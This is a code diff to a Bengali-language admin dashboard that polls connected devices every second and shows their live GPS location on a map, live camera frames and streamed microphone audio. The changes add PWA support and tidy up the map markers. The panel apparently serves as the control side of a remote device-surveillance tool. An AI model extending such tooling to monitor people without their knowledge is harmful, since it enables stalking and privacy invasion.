@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <title>অ্যাডমিন ড্যাশবোর্ড</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#0f172a">
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
@@ -87,7 +90,7 @@
         let markers = {};
         let lastAudTime = {};
         let activeLiveVideoId = null; 
-        let selectedDeviceId = null; // ট্র্যাক করার জন্য কোন ডিভাইস সিলেক্ট করা আছে
+        let selectedDeviceId = null;
 
         function fetchClients() {
             fetch('/api/clients')
@@ -99,19 +102,22 @@
 
                     if (clientIds.length === 0) {
                         list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
+                        // সব মার্কার রিমুভ
+                        Object.keys(markers).forEach(id => {
+                            map.removeLayer(markers[id]);
+                            delete markers[id];
+                        });
                         return;
                     }
 
                     clientIds.forEach(id => {
                         const data = clients[id];
                         const card = document.createElement('div');
-                        card.className = 'device-card online';
+                        card.className = 'device-card online' + (selectedDeviceId === id ? ' active' : '');
                         
-                        // কার্ডে ক্লিক করলে শুধু লোকেশন জুম করবে
                         card.onclick = () => {
-                            selectedDeviceId = id; // এই ডিভাইসটি সিলেক্টেড
+                            selectedDeviceId = id;
                             if (data.lat && data.lng && data.lat !== 0) {
-                                // অ্যানিমেশনসহ ম্যাপ সেন্টার করা
                                 map.flyTo([parseFloat(data.lat), parseFloat(data.lng)], 16, { duration: 1.5 });
                             }
                         };
@@ -130,14 +136,12 @@
                         `;
                         list.appendChild(card);
 
-                        // ভিডিও ফ্রেম আপডেট (যদি এই ডিভাইসের লাইভ ভিডিও দেখা হচ্ছে)
                         if (data.video_frame && data.video_time) {
                             if (activeLiveVideoId === id) {
                                 document.getElementById('liveVideoFeed').src = data.video_frame;
                             }
                         }
 
-                        // অডিও প্লে করা
                         if (data.audio_data && data.audio_time && lastAudTime[id] !== data.audio_time) {
                             lastAudTime[id] = data.audio_time;
                             document.getElementById('modalAudio').src = data.audio_data;
@@ -145,14 +149,12 @@
                             document.getElementById('modalAudio').play();
                         }
 
-                        // ম্যাপে মার্কার আপডেট (ব্লিংকিং ফিক্স)
                         if (data.lat && data.lng && data.lat !== 0) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             if (markers[id]) {
-                                markers[id].setLatLng(pos); // শুধু পজিশন আপডেট হবে, জুম হবে না
+                                markers[id].setLatLng(pos);
                             } else {
                                 markers[id] = L.marker(pos).addTo(map);
-                                // প্রথমবার লোড হলে একবার জুম করবে
                                 if (!selectedDeviceId) {
                                     map.flyTo(pos, 16, { duration: 1.5 });
                                     selectedDeviceId = id;
@@ -196,7 +198,14 @@
         }
 
         fetchClients();
-        setInterval(fetchClients, 1000); // প্রতি ১ সেকেন্ডে আপডেট (ভিডিও স্মুথ রাখার জন্য)
+        setInterval(fetchClients, 1000); 
+    </script>
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js')
+                .then(reg => console.log('SW Registered!', reg))
+                .catch(err => console.log('SW Failed!', err));
+        }
     </script>
 </body>
 </html>
